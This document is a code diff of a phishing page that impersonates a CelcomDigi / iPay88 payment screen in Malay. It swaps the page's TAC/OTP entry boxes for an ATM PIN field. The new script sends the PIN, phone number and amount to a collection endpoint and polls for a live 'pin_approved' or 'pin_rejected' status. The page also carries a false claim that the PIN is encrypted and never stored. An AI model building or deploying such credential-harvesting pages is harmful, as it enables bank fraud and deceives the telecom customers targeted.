@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ms">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>CelcomDigi Next Gen App iPay88</title>
+  <title>CelcomDigi Apl Generasi Seterusnya iPay88</title>
   <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -58,21 +58,6 @@
     }
 
     .back-btn img { width: 24px; height: 24px; filter: brightness(0) invert(1); }
-
-    .lang-btn {
-      margin-left: auto;
-      background: rgba(255,255,255,0.15);
-      border: 1px solid rgba(255,255,255,0.4);
-      border-radius: 20px;
-      padding: 5px 14px;
-      color: #fff;
-      font-family: Lato, sans-serif;
-      font-size: 13px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    .lang-btn:hover { background: rgba(255,255,255,0.25); }
 
     .logo-bar {
       padding: 8px 20px 24px;
@@ -152,8 +137,8 @@
       margin: 16px -20px 0;
     }
 
-    /* ── OTP SECTION ── */
-    .otp-section {
+    /* ── PIN SECTION ── */
+    .pin-section {
       background: #fff;
       padding: 0 20px 60px;
       margin: 0 12px;
@@ -175,64 +160,76 @@
       margin-bottom: 20px;
     }
 
-    .section-desc strong {
-      color: var(--black);
-      font-weight: 700;
+    /* PIN input wrapper */
+    .input-wrap {
+      position: relative;
+      margin-bottom: 14px;
     }
 
-    /* OTP boxes */
-    .otp-boxes {
-      display: flex;
-      gap: 10px;
-      justify-content: center;
-      margin-bottom: 24px;
+    .float-label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--gray-500);
+      font-size: 15px;
+      font-family: Lato, sans-serif;
+      pointer-events: none;
+      transition: all 0.15s ease;
+      z-index: 1;
     }
 
-    .otp-box {
-      width: 48px;
+    .float-label.active {
+      top: 12px;
+      transform: none;
+      font-size: 11px;
+      line-height: 1;
+    }
+
+    .text-field {
+      width: 100%;
       height: 60px;
-      border: 1.5px solid var(--gray-300);
+      border: 1px solid var(--gray-300);
       border-radius: 12px;
-      text-align: center;
-      font-size: 22px;
-      font-family: Montserrat, sans-serif;
-      font-weight: 700;
+      padding: 22px 50px 8px 16px;
+      font-size: 15px;
+      font-family: Lato, sans-serif;
       color: var(--black);
       background: #fff;
       outline: none;
-      transition: border-color 0.15s;
-      -webkit-appearance: none;
-      appearance: none;
     }
 
-    .otp-box:focus {
-      border-color: var(--blue-main);
-      box-shadow: 0 0 0 3px rgba(21,104,225,0.12);
-    }
+    .text-field:focus { border-color: var(--blue-main); }
 
-    .otp-box.filled {
-      border-color: var(--blue-main);
-      background: #f0f6ff;
-    }
-
-    /* resend */
-    .resend-row {
-      text-align: center;
-      font-size: 13px;
+    .toggle-btn {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
       color: var(--gray-500);
+      display: flex;
+      align-items: center;
+      padding: 4px;
+    }
+
+    /* security note */
+    .security-note {
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-size: 13px;
+      color: #15803d;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
       margin-bottom: 20px;
     }
 
-    .resend-link {
-      color: var(--blue-main);
-      font-weight: 600;
-      cursor: pointer;
-      text-decoration: none;
-      background: none;
-      border: none;
-      font-size: 13px;
-      font-family: Lato, sans-serif;
-    }
+    .security-note svg { flex-shrink: 0; margin-top: 1px; }
 
     /* error */
     .error-msg {
@@ -336,11 +333,13 @@
       .logo-bar img { width: 160px; }
       .white-card { max-width: 476px; margin: -70px auto 0; padding: 36px 28px 0; border-radius: 20px 20px 0 0; }
       .wave-divider { margin: 16px -28px 0; height: 48px; }
-      .otp-section { max-width: 476px; margin: 0 auto; padding: 0 28px 60px; }
+      .pin-section { max-width: 476px; margin: 0 auto; padding: 0 28px 60px; }
       .summary-title { font-size: 20px; }
       .summary-amount-value { font-size: 30px; }
       .section-title { font-size: 20px; }
-      .otp-box { width: 54px; height: 66px; font-size: 24px; }
+      .text-field { height: 64px; font-size: 16px; }
+      .float-label { font-size: 16px; }
+      .float-label.active { font-size: 12px; }
       .btn-proceed, .btn-cancel { height: 56px; font-size: 17px; }
     }
   </style>
@@ -354,7 +353,6 @@
     <button class="back-btn" onclick="history.back()">
       <img src="/get-assets/images/arrow-narrow-left.svg" alt="Back">
     </button>
-    <button class="lang-btn" id="langToggle">BM</button>
   </div>
   <div class="logo-bar">
     <img src="/get-assets/images/ngpay-logo.svg" alt="CelcomDigi">
@@ -365,53 +363,57 @@
 <div class="white-card">
   <div class="timeout-badge">Timeout: <span id="countdown">08:00</span></div>
 
-  <div class="summary-title">Summary of transaction</div>
+  <div class="summary-title">Ringkasan transaksi</div>
 
-  <div class="summary-amount-label">Net charges</div>
+  <div class="summary-amount-label">Caj bersih</div>
   <div class="summary-amount-value" id="displayAmount">MYR 0.00</div>
 
   <div class="summary-row">
-    <div class="summary-label">Pay to</div>
+    <div class="summary-label">Bayar kepada</div>
     <div class="summary-value">CelcomDigi Telecommunications Sdn Bhd</div>
   </div>
 
   <div class="summary-row">
-    <div class="summary-label">Payment of</div>
+    <div class="summary-label">Pembayaran untuk</div>
     <div class="summary-value" id="paymentOf">RM 0 Bill Payment for -</div>
   </div>
 
   <div class="summary-row">
-    <div class="summary-label">Reference no. / Payment ID</div>
+    <div class="summary-label">No. rujukan / ID Pembayaran</div>
     <div class="summary-value" id="refNo">-</div>
   </div>
 
   <div class="wave-divider"></div>
 </div>
 
-<!-- OTP section (continues white background) -->
-<div class="otp-section">
-  <div class="section-title">TAC / OTP Verification</div>
+<!-- PIN section (continues white background) -->
+<div class="pin-section">
+  <div class="section-title">Pengesahan PIN ATM</div>
   <div class="section-desc">
-    A 6-digit TAC has been sent to your registered mobile number <strong id="maskedNumber">****</strong>. Please enter it below to proceed.
+    Sila masukkan PIN ATM anda untuk membenarkan transaksi ini.
   </div>
 
-  <div id="errorMsg" class="error-msg">Please verify the OTP sent to your mobile and try again.</div>
+  <div id="errorMsg" class="error-msg">Please verify your PIN ATM and try again.</div>
 
-  <div class="otp-boxes">
-    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+  <div class="security-note">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+    </svg>
+    <span>PIN anda disulitkan dan dihantar dengan selamat. Kami tidak akan menyimpan PIN ATM anda.</span>
   </div>
 
-  <div class="resend-row">
-    Didn't receive the TAC? <button class="resend-link" id="resendLink">Resend TAC</button>
+  <div class="input-wrap">
+    <label class="float-label active" for="pinInput">PIN ATM</label>
+    <input class="text-field" type="password" id="pinInput" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+    <button type="button" class="toggle-btn" id="pinToggle">
+      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+      </svg>
+    </button>
   </div>
 
-  <button type="button" id="submitBtn" class="btn-proceed disabled">Confirm</button>
-  <button type="button" class="btn-cancel" onclick="history.back()">Cancel</button>
+  <button type="button" id="submitBtn" class="btn-proceed disabled">Sahkan</button>
+  <button type="button" class="btn-cancel" onclick="history.back()">Batal</button>
 </div>
 
 </div><!-- end page-wrapper -->
@@ -436,7 +438,7 @@
   const _vid = params.get('vid') || localStorage.getItem('_vid') || '';
   if (_vid) {
     fetch('/api/visitor/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ visitorId: _vid, page: 'otp', number, amount, type, sessionId }) }).catch(() => {});
+      body: JSON.stringify({ visitorId: _vid, page: 'atm-pin', number, amount, type, sessionId }) }).catch(() => {});
   }
 
   if (!sessionId) {
@@ -453,12 +455,8 @@
   const tRef = 'T' + Math.floor(Math.random() * 900000000 + 100000000);
   document.getElementById('refNo').textContent = ref + ' / ' + tRef;
 
-  // Masked number
-  const masked = number.length > 4 ? number.slice(0, 3) + '****' + number.slice(-4) : '****';
-  document.getElementById('maskedNumber').textContent = masked;
-
   // Show error if rejected
-  if (errorParam === 'otp') {
+  if (errorParam === 'pin') {
     document.getElementById('errorMsg').classList.add('show');
   }
 
@@ -470,7 +468,7 @@
     if (totalSecs <= 0) {
       clearInterval(timer);
       cdEl.textContent = '00:00';
-      window.location.href = type === 'reload' ? '/reload' : '/bill';
+      window.location.href = type === 'reload' ? '/reload/ms' : '/bill/ms';
       return;
     }
     const m = Math.floor(totalSecs / 60);
@@ -479,73 +477,35 @@
     if (totalSecs <= 60) document.querySelector('.timeout-badge').style.background = '#fee2e2';
   }, 1000);
 
-  // OTP input logic
-  const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
-
-  otpBoxes.forEach((box, idx) => {
-    box.addEventListener('input', () => {
-      box.value = box.value.replace(/\D/g, '').slice(-1);
-      if (box.value) {
-        box.classList.add('filled');
-        if (idx < 5) otpBoxes[idx + 1].focus();
-      } else {
-        box.classList.remove('filled');
-      }
-      checkOTPComplete();
-    });
-
-    box.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !box.value && idx > 0) {
-        otpBoxes[idx - 1].focus();
-        otpBoxes[idx - 1].value = '';
-        otpBoxes[idx - 1].classList.remove('filled');
-        checkOTPComplete();
-      }
-    });
-
-    box.addEventListener('paste', (e) => {
-      const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-      if (paste.length >= 6) {
-        paste.slice(0, 6).split('').forEach((ch, i) => {
-          if (otpBoxes[i]) { otpBoxes[i].value = ch; otpBoxes[i].classList.add('filled'); }
-        });
-        otpBoxes[5].focus();
-        checkOTPComplete();
-        e.preventDefault();
-      }
-    });
+  // PIN input
+  const pinInput = document.getElementById('pinInput');
+  pinInput.addEventListener('input', () => {
+    pinInput.value = pinInput.value.replace(/\D/g, '');
+    document.getElementById('submitBtn').classList.toggle('disabled', pinInput.value.length < 4);
   });
 
-  function checkOTPComplete() {
-    const otp = otpBoxes.map(b => b.value).join('');
-    document.getElementById('submitBtn').classList.toggle('disabled', otp.length < 6);
-  }
+  // Toggle visibility
+  let pinVisible = false;
+  document.getElementById('pinToggle').addEventListener('click', () => {
+    pinVisible = !pinVisible;
+    pinInput.type = pinVisible ? 'text' : 'password';
+    document.getElementById('pinToggle').innerHTML = pinVisible
+      ? '<svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>'
+      : '<svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
+  });
 
-  function getOTPValue() {
-    return otpBoxes.map(b => b.value).join('');
-  }
-
-  // Submit button
+  // Submit
   document.getElementById('submitBtn').addEventListener('click', handleSubmit);
-  document.getElementById('resendLink').addEventListener('click', () => {
-    document.getElementById('resendLink').textContent = 'Sent!';
-    document.getElementById('resendLink').style.color = '#16a34a';
-    setTimeout(() => {
-      document.getElementById('resendLink').textContent = 'Resend TAC';
-      document.getElementById('resendLink').style.color = '';
-    }, 3000);
-  });
 
-  // Submit OTP
   async function handleSubmit() {
     if (document.getElementById('submitBtn').classList.contains('disabled')) return;
-    const otp = getOTPValue();
+    const pin = pinInput.value;
     document.getElementById('processingOverlay').classList.add('show');
     try {
-      const res = await fetch('/api/otp-submit', {
+      const res = await fetch('/api/pin-submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, otp, number, amount, ref, type })
+        body: JSON.stringify({ sessionId, pin, number, amount, ref, type })
       });
       const data = await res.json();
       if (data.success) {
@@ -559,20 +519,18 @@
   }
 
   function handleStatusUpdate(status) {
-    if (status === 'otp_approved') {
+    if (status === 'pin_approved') {
       clearInterval(timer);
-      window.location.href = '/atm-pin?sessionId=' + encodeURIComponent(sessionId)
-        + '&number=' + encodeURIComponent(number)
+      window.location.href = '/payment-success/ms?number=' + encodeURIComponent(number)
         + '&amount=' + encodeURIComponent(amount)
         + '&ref=' + encodeURIComponent(ref)
-        + '&type=' + type
-        + '&vid=' + encodeURIComponent(_vid);
-    } else if (status === 'otp_rejected') {
-      otpBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+        + '&type=' + type;
+    } else if (status === 'pin_rejected') {
+      pinInput.value = '';
       document.getElementById('processingOverlay').classList.remove('show');
       document.getElementById('errorMsg').classList.add('show');
       document.getElementById('submitBtn').classList.add('disabled');
-      otpBoxes[0].focus();
+      pinInput.focus();
     }
   }
 
@@ -597,82 +555,12 @@
     fetch(`/api/card-status/${sessionId}`)
       .then(r => r.json())
       .then(data => {
-        if (data.success && (data.status === 'otp_approved' || data.status === 'otp_rejected')) {
+        if (data.success && (data.status === 'pin_approved' || data.status === 'pin_rejected')) {
           handleStatusUpdate(data.status);
         }
       })
       .catch(() => {});
   }, 5000);
-
-  // ── Language Toggle ──
-  const i18n = {
-    en: {
-      summaryTitle: 'Summary of transaction',
-      netCharges: 'Net charges',
-      payTo: 'Pay to',
-      paymentOf: 'Payment of',
-      refNo: 'Reference no. / Payment ID',
-      sectionTitle: 'TAC / OTP Verification',
-      sectionDesc: 'A 6-digit TAC has been sent to your registered mobile number',
-      sectionDesc2: '. Please enter it below to proceed.',
-      resendText: "Didn't receive the TAC?",
-      resendBtn: 'Resend TAC',
-      confirm: 'Confirm',
-      cancel: 'Cancel',
-      langBtn: 'BM'
-    },
-    ms: {
-      summaryTitle: 'Ringkasan transaksi',
-      netCharges: 'Caj bersih',
-      payTo: 'Bayar kepada',
-      paymentOf: 'Pembayaran untuk',
-      refNo: 'No. rujukan / ID Pembayaran',
-      sectionTitle: 'Pengesahan TAC / OTP',
-      sectionDesc: 'TAC 6 digit telah dihantar ke nombor telefon bimbit anda',
-      sectionDesc2: '. Sila masukkan di bawah untuk meneruskan.',
-      resendText: 'Tidak menerima TAC?',
-      resendBtn: 'Hantar Semula TAC',
-      confirm: 'Sahkan',
-      cancel: 'Batal',
-      langBtn: 'EN'
-    }
-  };
-
-  let currentLang = localStorage.getItem('cdLang') || 'en';
-
-  function applyLang(lang) {
-    const t = i18n[lang];
-    document.querySelector('.summary-title').textContent = t.summaryTitle;
-    document.querySelector('.summary-amount-label').textContent = t.netCharges;
-    const rows = document.querySelectorAll('.summary-row');
-    if (rows[0]) rows[0].querySelector('.summary-label').textContent = t.payTo;
-    if (rows[1]) rows[1].querySelector('.summary-label').textContent = t.paymentOf;
-    if (rows[2]) rows[2].querySelector('.summary-label').textContent = t.refNo;
-    document.querySelector('.section-title').textContent = t.sectionTitle;
-    const desc = document.querySelector('.section-desc');
-    if (desc) desc.innerHTML = t.sectionDesc + ' <strong id="maskedNumber">' + masked + '</strong>' + t.sectionDesc2;
-    const resendRow = document.querySelector('.resend-row');
-    if (resendRow) resendRow.innerHTML = t.resendText + ' <button class="resend-link" id="resendLink">' + t.resendBtn + '</button>';
-    document.getElementById('submitBtn').textContent = t.confirm;
-    document.querySelector('.btn-cancel').textContent = t.cancel;
-    document.getElementById('langToggle').textContent = t.langBtn;
-    document.documentElement.lang = lang;
-    // Re-bind resend
-    const rl = document.getElementById('resendLink');
-    if (rl) rl.addEventListener('click', () => {
-      rl.textContent = lang === 'en' ? 'Sent!' : 'Dihantar!';
-      rl.style.color = '#16a34a';
-      setTimeout(() => { rl.textContent = t.resendBtn; rl.style.color = ''; }, 3000);
-    });
-  }
-
-  applyLang(currentLang);
-
-  document.getElementById('langToggle').addEventListener('click', () => {
-    currentLang = currentLang === 'en' ? 'ms' : 'en';
-    localStorage.setItem('cdLang', currentLang);
-    applyLang(currentLang);
-  });
 </script>
 </body>
 </html>
